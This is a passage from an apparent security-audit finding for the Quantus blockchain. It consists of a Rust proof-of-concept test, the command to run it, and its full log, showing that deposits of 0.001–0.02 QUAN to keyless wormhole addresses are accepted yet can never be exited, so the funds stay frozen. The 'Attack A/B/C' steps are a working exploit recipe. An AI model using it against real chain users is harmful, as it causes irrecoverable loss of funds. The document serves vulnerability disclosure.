		.filter_map(|record| match record.event {
			RuntimeEvent::Wormhole(pallet_wormhole::Event::NativeTransferred {
				from,
				to,
				amount,
				transfer_count,
				leaf_index,
			}) if from == *sender && to == *dest => Some((transfer_count, leaf_index, amount)),
			_ => None,
		})
		.collect();

	println!("  dest.free_balance        = {}", fmt_quan(dest_balance));
	println!("  ZkTree.leaf_count        = {leaf_count}");
	println!("  Wormhole.transfer_count  = {transfer_count}");
	println!("  NativeTransferred events = {}", native_events.len());
	println!("  per-leaf circuit check:");

	let mut unexitable = 0u32;
	for idx in 0..leaf_count {
		let leaf = ZkTree::leaf(idx).expect("leaf must exist");
		assert_eq!(&leaf.to, dest, "every leaf must be for the wormhole dest");
		assert_eq!(leaf.amount, quantum, "every drip leaf must be exactly 1 quantum");
		let quantized = leaf.amount / quantum;
		let max_out = circuit_max_output_quanta(quantized, fee_bps);
		println!(
			"    leaf[{idx}] amount={} quantized={quantized} max_out={max_out} exitable={}",
			fmt_quan(leaf.amount),
			max_out > 0
		);
		assert_eq!(quantized, 1);
		assert_eq!(max_out, 0, "a 1-quantum leaf cannot satisfy out>=1");
		unexitable += 1;
	}

	assert_eq!(dest_balance, expected, "full aggregate must sit on the destination");
	assert_eq!(leaf_count, n as u64, "each drip deposit must insert its own leaf");
	assert_eq!(transfer_count, n as u64);
	assert_eq!(
		native_events.len(),
		n as usize,
		"each accepted drip deposit must emit the wormhole NativeTransferred recorder event"
	);
	for (idx, (event_count, leaf_index, amount)) in native_events.iter().copied().enumerate() {
		assert_eq!(event_count, idx as u64, "event transfer_count must match leaf order");
		assert_eq!(leaf_index, idx as u64, "event leaf_index must match ZK tree index");
		assert_eq!(amount, quantum, "event amount must be the accepted 1-quantum deposit");
	}
	assert_eq!(unexitable, n, "every drip leaf must be unexitable");

	println!("  >>> FUNDS FROZEN         = {}", fmt_quan(dest_balance));
	println!("  >>> reason               = leaves are 1-in; ten quantized-1 leaves");
	println!("      cannot be combined into one quantized-10 input. Aggregate");
	println!("      balance is 5× the fee floor and still fully frozen.");
	dest_balance
}

/// Full E2E: live runtime constants, real Dilithium-65 signature, production
/// `TxExtension` recorder, official Poseidon wormhole dest, independent circuit
/// fee math, printed frozen amounts.
#[test]
fn poc_wormhole_deposits_below_fee_exitable_minimum_are_permanently_frozen() {
	let alice_pair = Dilithium65Pair::from_seed_slice(&[1u8; 32]).expect("valid Alice seed");
	let bob_pair = Dilithium65Pair::from_seed_slice(&[2u8; 32]).expect("valid Bob seed");
	let alice: AccountId32 = alice_pair.public().into_account();
	let bob: AccountId32 = bob_pair.public().into_account();
	let victim = victim_wormhole();

	let quantum = VestingPayoutQuantum::get();
	let fee_bps = VolumeFeeRateBps::get();
	let ed = EXISTENTIAL_DEPOSIT;

	println!();
	println!("==============================================================");
	println!(" PoC: wormhole deposits below the fee-exitable minimum freeze");
	println!("==============================================================");

	// ------------------------------------------------------------------
	// Step 0 — Live runtime constants (not pallet-mock defaults).
	// ------------------------------------------------------------------
	println!("\n[Step 0] Live runtime constants");
	println!("  UNIT (1 QUAN)            = {UNIT} planck");
	println!("  EXISTENTIAL_DEPOSIT      = {}", fmt_quan(ed));
	println!("  VestingPayoutQuantum     = {}  (SCALE_DOWN_FACTOR / 0.01 QUAN)", fmt_quan(quantum));
	println!("  VolumeFeeRateBps         = {fee_bps}");
	println!("  fee-exitable minimum     = {}  (2 quanta; pallet comment:", fmt_quan(2 * quantum));
	println!("      \"one quantum out forces input >= 2 quanta\")");
	assert_eq!(ed, 1_000_000_000, "ED must be 0.001 QUAN on this runtime");
	assert_eq!(quantum, 10_000_000_000, "quantum must be 0.01 QUAN");
	assert_eq!(fee_bps, 4);
	assert!(ed < quantum, "ED is strictly below one quantum — that is the mismatch");
	assert!(
		2 * quantum > ed,
		"the fee-exitable floor is 20x ED, so Balances accepts deposits the circuit cannot exit"
	);

	// ------------------------------------------------------------------
	// Step 1 — Identities: Alice/Bob are Dilithium; victim is Poseidon wormhole.
	// ------------------------------------------------------------------
	println!("\n[Step 1] Identities");
	println!("  Alice (ML-DSA-65)        = {}", hex32(&alice));
	println!("  Bob   (ML-DSA-65)        = {}", hex32(&bob));
	println!("  Victim (wormhole)        = {}", hex32(&victim));
	assert_ne!(alice, victim, "Alice Dilithium account must not be the wormhole dest");
	assert_ne!(bob, victim, "Bob Dilithium account must not be the wormhole dest");
	println!("  [ok] victim is not hash(dilithium_pk) of Alice or Bob");
	println!("  [ok] victim is the official Poseidon test wormhole address");

	// ------------------------------------------------------------------
	// Step 2 — Positive control: the same ED is spendable on a Dilithium account.
	// ------------------------------------------------------------------
	println!("\n[Step 2] Positive control — ED to a Dilithium account is spendable");
	let mut ext_control = test_ext(&alice);
	ext_control.execute_with(|| {
		Balances::make_free_balance_be(&bob, 10 * UNIT);
		let bob_before = Balances::free_balance(&bob);

		let xt = signed_transfer(&alice_pair, alice.clone(), bob.clone(), ed, 0);
		assert_ok!(Executive::apply_extrinsic(xt).expect("Alice transfer to Bob must validate"));
		assert_eq!(
			Balances::free_balance(&bob),
			bob_before + ed,
			"Bob must receive the existential deposit"
		);
		println!("  Alice --ED--> Bob        = {}", fmt_quan(ed));
		println!("  Bob.free_balance after   = {}", fmt_quan(Balances::free_balance(&bob)));

		// Bob spends that ED onward to a third Dilithium account.
		let carol_pair = Dilithium65Pair::from_seed_slice(&[3u8; 32]).expect("valid Carol seed");
		let carol: AccountId32 = carol_pair.public().into_account();
		let xt = signed_transfer(&bob_pair, bob.clone(), carol.clone(), ed, 0);
		assert_ok!(Executive::apply_extrinsic(xt).expect("Bob spend of ED must validate"));
		assert_eq!(
			Balances::free_balance(&carol),
			ed,
			"Carol received the ED Bob just spent — Dilithium accounts can move ED"
		);
		println!("  Bob --ED--> Carol        = {}", fmt_quan(ed));
		println!("  Carol.free_balance       = {}", fmt_quan(Balances::free_balance(&carol)));
		println!("  [ok] ED is spendable when the dest has an ML-DSA-65 key");
	});

	// ------------------------------------------------------------------
	// Step 3 — Negative control: an extrinsic claiming the wormhole dest as
	// signer, but signed by Alice's Dilithium key, is rejected. This is the
	// production signature check. Do not use RawOrigin::Signed(victim).
	// ------------------------------------------------------------------
	println!("\n[Step 3] Negative control — wormhole dest cannot Dilithium-sign");
	let mut ext_sig = test_ext(&alice);
	ext_sig.execute_with(|| {
		Balances::make_free_balance_be(&victim, ed);
		let xt = signed_transfer(&alice_pair, victim.clone(), alice.clone(), ed, 0);
		let err = Executive::apply_extrinsic(xt);
		assert!(err.is_err(), "extrinsic claiming wormhole dest as sender must be rejected");
		println!("  claimed sender           = victim wormhole address");
		println!("  actual signature         = Alice ML-DSA-65");
		println!("  apply_extrinsic          = {err:?}");
		println!("  [ok] no Dilithium spend path for the wormhole dest");
	});

	// ------------------------------------------------------------------
	// Step 4 — Attack B (headline): 1 quantum (0.01 QUAN) is the documented
	// wormhole unit and is ON the quantization grid, but still below the
	// fee-exitable minimum. Circuit max output = 0.
	// ------------------------------------------------------------------
	let mut ext_q1 = test_ext(&alice);
	let case_q1 = ext_q1.execute_with(|| {
		run_deposit_scenario(
			"[Step 4] Attack B — transfer 1 quantum (documented unit, on-grid, not fee-exitable)",
			&alice_pair,
			&alice,
			&victim,
			quantum,
		)
	});
	assert_eq!(case_q1.quantized, 1);
	assert_eq!(case_q1.max_out, 0);
	assert!(!case_q1.leaf_hash_eq_zero, "1 quantum must not hash as 0");
	assert_eq!(case_q1.frozen, quantum);

	// ------------------------------------------------------------------
	// Step 5 — Attack A: ED (0.001 QUAN) hashes as quantized 0. Same freeze.
	// Shown second so the headline is not "dust below one quantum".
	// ------------------------------------------------------------------
	let mut ext_ed = test_ext(&alice);
	let case_ed = ext_ed.execute_with(|| {
		run_deposit_scenario(
			"[Step 5] Attack A — transfer EXISTENTIAL_DEPOSIT to wormhole dest",
			&alice_pair,
			&alice,
			&victim,
			ed,
		)
	});
	assert_eq!(case_ed.quantized, 0);
	assert_eq!(case_ed.max_out, 0);
	assert!(case_ed.leaf_hash_eq_zero, "ED must hash as quantized 0");
	assert_eq!(case_ed.frozen, ed);

	// ------------------------------------------------------------------
	// Step 6 — Contrast: 2 quanta CAN satisfy a 1-quantum exit. Same dest
	// type, same recorder, same circuit — only the amount changed.
	// ------------------------------------------------------------------
	let mut ext_q2 = test_ext(&alice);
	let case_q2 = ext_q2.execute_with(|| {
		run_deposit_scenario(
			"[Step 6] Contrast — 2 quanta is the fee-exitable minimum (not frozen)",
			&alice_pair,
			&alice,
			&victim,
			2 * quantum,
		)
	});
	assert_eq!(case_q2.quantized, 2);
	assert_eq!(case_q2.max_out, 1);
	assert_eq!(case_q2.frozen, 0);

	// ------------------------------------------------------------------
	// Step 7 — Leaves cannot be merged. Ten 1-quantum deposits freeze the
	// full 0.10 QUAN (5× the fee floor). The same 0.10 as one transfer can
	// exit 9 quanta. This is not "user should deposit more".
	// ------------------------------------------------------------------
	let drip_n = 10u32;
	let mut ext_drip = test_ext(&alice);
	let drip_frozen =
		ext_drip.execute_with(|| run_drip_deposits(&alice_pair, &alice, &victim, quantum, drip_n));
	assert_eq!(drip_frozen, (drip_n as u128) * quantum);

	let lump = (drip_n as u128) * quantum;
	let mut ext_lump = test_ext(&alice);
	let case_lump = ext_lump.execute_with(|| {
		run_deposit_scenario(
			"[Step 7b] Contrast — one 0.10 QUAN transfer (same total, one leaf)",
			&alice_pair,
			&alice,
			&victim,
			lump,
		)
	});
	assert_eq!(case_lump.quantized, drip_n as u128);
	assert_eq!(case_lump.max_out, 9, "10 quanta can exit 9 (fee = 1 quantum)");
	assert_eq!(case_lump.frozen, 0);

	// ------------------------------------------------------------------
	// Step 8 — Independent fee table (no pallet internals).
	// ------------------------------------------------------------------
	println!("\n[Step 8] Independent circuit fee table (VolumeFeeRateBps = {fee_bps})");
	println!("  input quanta | max output | exitable?");
	for input in 0u128..=10 {
		if input > 4 && input != 10 {
			continue;
		}
		let max_out = circuit_max_output_quanta(input, fee_bps);
		println!(
			"           {input:>2} |          {max_out} | {}",
			if max_out > 0 { "yes" } else { "NO — frozen if dest is keyless" }
		);
	}
	assert!(!circuit_allows(0, 1, fee_bps));
	assert!(!circuit_allows(1, 1, fee_bps));
	assert!(circuit_allows(2, 1, fee_bps));
	assert!(circuit_allows(10, 9, fee_bps));

	// ------------------------------------------------------------------
	// Step 9 — Pallet skip: even a 0-output "exit" mints nothing.
	// Documented here from process_exit_bundle: summed_output_amount == 0
	// is treated as a dummy slot. Combined with Steps 4/5/7, there is no
	// recovery path.
	// ------------------------------------------------------------------
	println!("\n[Step 9] Pallet settlement skip (process_exit_bundle)");
	println!("  if exit_account == 0x00..00 OR summed_output_amount == 0 {{ continue; }}");
	println!("  A prover cannot produce a valid proof with output >= 1 for");
	println!("  quantized input 0 or 1 (Step 8). A proof with output 0 is");
	println!("  skipped and mints nothing. The dest free_balance is unchanged.");
	println!("  Ten such leaves (Step 7) still mint nothing: they cannot be");
	println!("  summed into one input of 10 quanta.");

	// ------------------------------------------------------------------
	// Step 10 — Loss summary.
	// ------------------------------------------------------------------
	println!("\n==============================================================");
	println!(" LOSS");
	println!("==============================================================");
	println!("  Attack B (1 quantum, documented unit)  FROZEN {}", fmt_quan(case_q1.frozen));
	println!("  Attack A (ED, 0.001 QUAN)              FROZEN {}", fmt_quan(case_ed.frozen));
	println!(
		"  Contrast (2 quanta, 0.02 QUAN)          not frozen (max out = {} quantum)",
		case_q2.max_out
	);
	println!("  ----------------------------------------------------------");
	println!("  Attack C (10 × 1 quantum, same dest)   FROZEN {}", fmt_quan(drip_frozen));
	println!(
		"  Contrast (1 × 0.10 QUAN, same total)    not frozen by this bug (max out = {} quanta)",
		case_lump.max_out
	);
	println!("  ----------------------------------------------------------");
	println!("  Headline freeze in this PoC            {}", fmt_quan(drip_frozen));
	println!(
		"  Freeze range on live runtime           [ED, 2*quantum) = [{ed}, {}) planck",
		2 * quantum
	);
	println!("  Any permissionless transfer in that range to a keyless /");
	println!("  wormhole dest is accepted by Balances, recorded as a leaf,");
	println!("  and can never be Dilithium-spent or wormhole-exited.");
	println!("  Leaves cannot be merged: depositing more in separate");
	println!("  transfers does not make earlier credits exitable.");
	println!("==============================================================");

	assert_eq!(case_ed.deposited, ed);
	assert_eq!(case_q1.deposited, quantum);
	assert_eq!(case_lump.deposited, lump);
}
```

{% endstep %}

{% step %}

### Run the test

```bash
cd codebases/chain   # audit-comp-quantus-chain repo root
cargo test --release -p quantus-runtime --test mod poc_wormhole_deposits_below_fee_exitable -- --nocapture
```

{% endstep %}
{% endstepper %}

### Full log

```
running 1 test

==============================================================
 PoC: wormhole deposits below the fee-exitable minimum freeze
==============================================================

[Step 0] Live runtime constants
  UNIT (1 QUAN)            = 1000000000000 planck
  EXISTENTIAL_DEPOSIT      = 0.001000000000 QUAN (1000000000 planck)
  VestingPayoutQuantum     = 0.010000000000 QUAN (10000000000 planck)  (SCALE_DOWN_FACTOR / 0.01 QUAN)
  VolumeFeeRateBps         = 4
  fee-exitable minimum     = 0.020000000000 QUAN (20000000000 planck)  (2 quanta; pallet comment:
      "one quantum out forces input >= 2 quanta")

[Step 1] Identities
  Alice (ML-DSA-65)        = 0x7b3591c96ca092b42076cce38eb7ac5f408f6590431ac53de44ac05e72f8cc0e
  Bob   (ML-DSA-65)        = 0x13202f3ea0c8c411ad5b3c12fead9ca847abe8e4b7a92c6325a3be3113ac893b
  Victim (wormhole)        = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  [ok] victim is not hash(dilithium_pk) of Alice or Bob
  [ok] victim is the official Poseidon test wormhole address

[Step 2] Positive control — ED to a Dilithium account is spendable
  Alice --ED--> Bob        = 0.001000000000 QUAN (1000000000 planck)
  Bob.free_balance after   = 10.001000000000 QUAN (10001000000000 planck)
  Bob --ED--> Carol        = 0.001000000000 QUAN (1000000000 planck)
  Carol.free_balance       = 0.001000000000 QUAN (1000000000 planck)
  [ok] ED is spendable when the dest has an ML-DSA-65 key

[Step 3] Negative control — wormhole dest cannot Dilithium-sign
  claimed sender           = victim wormhole address
  actual signature         = Alice ML-DSA-65
  apply_extrinsic          = Err(TransactionValidityError::Invalid(InvalidTransaction::BadProof))
  [ok] no Dilithium spend path for the wormhole dest

--------------------------------------------------------------
 [Step 4] Attack B — transfer 1 quantum (documented unit, on-grid, not fee-exitable)
--------------------------------------------------------------
  deposit                  = 0.010000000000 QUAN (10000000000 planck)
  dest (wormhole)          = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  dest.free_balance        = 0.010000000000 QUAN (10000000000 planck)
  ZkTree.leaf_count        = 1
  Wormhole.transfer_count  = 1
  NativeTransferred event  = yes (amount/count/leaf_index asserted)
  stored leaf.amount       = 0.010000000000 QUAN (10000000000 planck)
  stored leaf.to           = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  quantized input (leaf)   = 1  (= amount / 10^10)
  hash_leaf(stored)        = 0x8c7cb7146d65a7948a5247a72bb9df1d2c7e5d4f78be78b4c80178a8197518dc
  hash_leaf(amount=0)      = 0x017bfa26047d169d1cc3acf150a8b2978df5e58c6fbfedfcd9801a2e503e4140
  hash_leaf(1 quantum)     = 0x8c7cb7146d65a7948a5247a72bb9df1d2c7e5d4f78be78b4c80178a8197518dc
  hash(stored)==hash(0)    = false
  fee constraint           = (out)*10000 <= input*(10000-4)
  max circuit output       = 0 quanta
  circuit allows 1-quantum exit = false
  >>> FUNDS FROZEN         = 0.010000000000 QUAN (10000000000 planck)
  >>> reason               = no positive circuit output is satisfiable;
      pallet-wormhole skips summed_output_amount == 0, so the
      deposit cannot leave the keyless destination.

--------------------------------------------------------------
 [Step 5] Attack A — transfer EXISTENTIAL_DEPOSIT to wormhole dest
--------------------------------------------------------------
  deposit                  = 0.001000000000 QUAN (1000000000 planck)
  dest (wormhole)          = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  dest.free_balance        = 0.001000000000 QUAN (1000000000 planck)
  ZkTree.leaf_count        = 1
  Wormhole.transfer_count  = 1
  NativeTransferred event  = yes (amount/count/leaf_index asserted)
  stored leaf.amount       = 0.001000000000 QUAN (1000000000 planck)
  stored leaf.to           = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  quantized input (leaf)   = 0  (= amount / 10^10)
  hash_leaf(stored)        = 0x017bfa26047d169d1cc3acf150a8b2978df5e58c6fbfedfcd9801a2e503e4140
  hash_leaf(amount=0)      = 0x017bfa26047d169d1cc3acf150a8b2978df5e58c6fbfedfcd9801a2e503e4140
  hash_leaf(1 quantum)     = 0x8c7cb7146d65a7948a5247a72bb9df1d2c7e5d4f78be78b4c80178a8197518dc
  hash(stored)==hash(0)    = true
  fee constraint           = (out)*10000 <= input*(10000-4)
  max circuit output       = 0 quanta
  circuit allows 1-quantum exit = false
  >>> FUNDS FROZEN         = 0.001000000000 QUAN (1000000000 planck)
  >>> reason               = no positive circuit output is satisfiable;
      pallet-wormhole skips summed_output_amount == 0, so the
      deposit cannot leave the keyless destination.

--------------------------------------------------------------
 [Step 6] Contrast — 2 quanta is the fee-exitable minimum (not frozen)
--------------------------------------------------------------
  deposit                  = 0.020000000000 QUAN (20000000000 planck)
  dest (wormhole)          = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  dest.free_balance        = 0.020000000000 QUAN (20000000000 planck)
  ZkTree.leaf_count        = 1
  Wormhole.transfer_count  = 1
  NativeTransferred event  = yes (amount/count/leaf_index asserted)
  stored leaf.amount       = 0.020000000000 QUAN (20000000000 planck)
  stored leaf.to           = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  quantized input (leaf)   = 2  (= amount / 10^10)
  hash_leaf(stored)        = 0x60f43553b003377aba757af8643cac4d429ee1a1696f5fc593a81b8652636eb1
  hash_leaf(amount=0)      = 0x017bfa26047d169d1cc3acf150a8b2978df5e58c6fbfedfcd9801a2e503e4140
  hash_leaf(1 quantum)     = 0x8c7cb7146d65a7948a5247a72bb9df1d2c7e5d4f78be78b4c80178a8197518dc
  hash(stored)==hash(0)    = false
  fee constraint           = (out)*10000 <= input*(10000-4)
  max circuit output       = 1 quanta
  circuit allows 1-quantum exit = true
  >>> NOT frozen by this bug (input 2 quanta can exit 1 quanta)

--------------------------------------------------------------
 [Step 7] Attack C — 10 separate 1-quantum deposits to the same dest
--------------------------------------------------------------
  per deposit              = 0.010000000000 QUAN (10000000000 planck)
  deposit count            = 10
  aggregate                = 0.100000000000 QUAN (100000000000 planck)
  dest (wormhole)          = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  fee-exitable floor       = 0.020000000000 QUAN (20000000000 planck)
  aggregate vs floor       = 5× the fee-exitable minimum
  dest.free_balance        = 0.100000000000 QUAN (100000000000 planck)
  ZkTree.leaf_count        = 10
  Wormhole.transfer_count  = 10
  NativeTransferred events = 10
  per-leaf circuit check:
    leaf[0] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[1] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[2] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[3] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[4] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[5] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[6] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[7] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[8] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
    leaf[9] amount=0.010000000000 QUAN (10000000000 planck) quantized=1 max_out=0 exitable=false
  >>> FUNDS FROZEN         = 0.100000000000 QUAN (100000000000 planck)
  >>> reason               = leaves are 1-in; ten quantized-1 leaves
      cannot be combined into one quantized-10 input. Aggregate
      balance is 5× the fee floor and still fully frozen.

--------------------------------------------------------------
 [Step 7b] Contrast — one 0.10 QUAN transfer (same total, one leaf)
--------------------------------------------------------------
  deposit                  = 0.100000000000 QUAN (100000000000 planck)
  dest (wormhole)          = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  dest.free_balance        = 0.100000000000 QUAN (100000000000 planck)
  ZkTree.leaf_count        = 1
  Wormhole.transfer_count  = 1
  NativeTransferred event  = yes (amount/count/leaf_index asserted)
  stored leaf.amount       = 0.100000000000 QUAN (100000000000 planck)
  stored leaf.to           = 0xbe13a189f99c44a959e26694ffe5e4ba223092f3edbe8259c1d45ad08edb403d
  quantized input (leaf)   = 10  (= amount / 10^10)
  hash_leaf(stored)        = 0x990d938a64b326be8eb1adf3c7fad02e9d54ed9a802dfd37dfa175c5512cfd82
  hash_leaf(amount=0)      = 0x017bfa26047d169d1cc3acf150a8b2978df5e58c6fbfedfcd9801a2e503e4140
  hash_leaf(1 quantum)     = 0x8c7cb7146d65a7948a5247a72bb9df1d2c7e5d4f78be78b4c80178a8197518dc
  hash(stored)==hash(0)    = false
  fee constraint           = (out)*10000 <= input*(10000-4)
  max circuit output       = 9 quanta
  circuit allows 1-quantum exit = true
  >>> NOT frozen by this bug (input 10 quanta can exit 9 quanta)

[Step 8] Independent circuit fee table (VolumeFeeRateBps = 4)
  input quanta | max output | exitable?
            0 |          0 | NO — frozen if dest is keyless
            1 |          0 | NO — frozen if dest is keyless
            2 |          1 | yes
            3 |          2 | yes
            4 |          3 | yes
           10 |          9 | yes

[Step 9] Pallet settlement skip (process_exit_bundle)
  if exit_account == 0x00..00 OR summed_output_amount == 0 { continue; }
  A prover cannot produce a valid proof with output >= 1 for
  quantized input 0 or 1 (Step 8). A proof with output 0 is
  skipped and mints nothing. The dest free_balance is unchanged.
  Ten such leaves (Step 7) still mint nothing: they cannot be
  summed into one input of 10 quanta.

==============================================================
 LOSS
==============================================================
  Attack B (1 quantum, documented unit)  FROZEN 0.010000000000 QUAN (10000000000 planck)
  Attack A (ED, 0.001 QUAN)              FROZEN 0.001000000000 QUAN (1000000000 planck)
  Contrast (2 quanta, 0.02 QUAN)          not frozen (max out = 1 quantum)
  ----------------------------------------------------------
  Attack C (10 × 1 quantum, same dest)   FROZEN 0.100000000000 QUAN (100000000000 planck)
  Contrast (1 × 0.10 QUAN, same total)    not frozen by this bug (max out = 9 quanta)
  ----------------------------------------------------------
  Headline freeze in this PoC            0.100000000000 QUAN (100000000000 planck)
  Freeze range on live runtime           [ED, 2*quantum) = [1000000000, 20000000000) planck
  Any permissionless transfer in that range to a keyless /
  wormhole dest is accepted by Balances, recorded as a leaf,
  and can never be Dilithium-spent or wormhole-exited.
  Leaves cannot be merged: depositing more in separate
  transfers does not make earlier credits exitable.
==============================================================
test transactions::poc_fee_exitable_wormhole_freeze::poc_wormhole_deposits_below_fee_exitable_minimum_are_permanently_frozen ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 44 filtered out; finished in 0.03s
```

The log proves:

1. Live ED is 0.001 QUAN and the fee-exitable floor is 0.02 QUAN — a 20× gap, not a mock artifact.
2. Victim `0xbe13a189…403d` is the official Poseidon wormhole address, not Alice’s or Bob’s Dilithium account.
3. The same ED is spent twice on Dilithium accounts (Alice → Bob → Carol). The freeze is not “ED transfers are broken”.
4. Claiming the wormhole destination as signer is `BadProof`. There is no Dilithium spend path.
5. Attack B: 1 quantum lands, emits the wormhole `NativeTransferred` recorder event, hashes as 1, max circuit output is 0, and **0.01 QUAN is frozen**.
6. Attack A: ED lands, `hash_leaf(stored) == hash_leaf(0)`, max circuit output is 0, and **0.001 QUAN is frozen**.
7. Two quanta can exit one quantum. The bug boundary is exact.
8. Attack C: ten separate 1-quantum deposits to the same destination result in `free_balance = 0.10 QUAN`, `leaf_count = 10`, and ten recorder events. Every leaf is quantized as 1 and unexitable, so **0.10 QUAN is frozen**.
9. The same 0.10 QUAN as one transfer produces quantized input 10 and max output 9. Depositing the same total in one leaf is exitable; dripping it is not.
10. The printed headline loss is **100\_000\_000\_000 planck = 0.10 QUAN**, with freeze range `[10^9, 2×10^10)` planck.
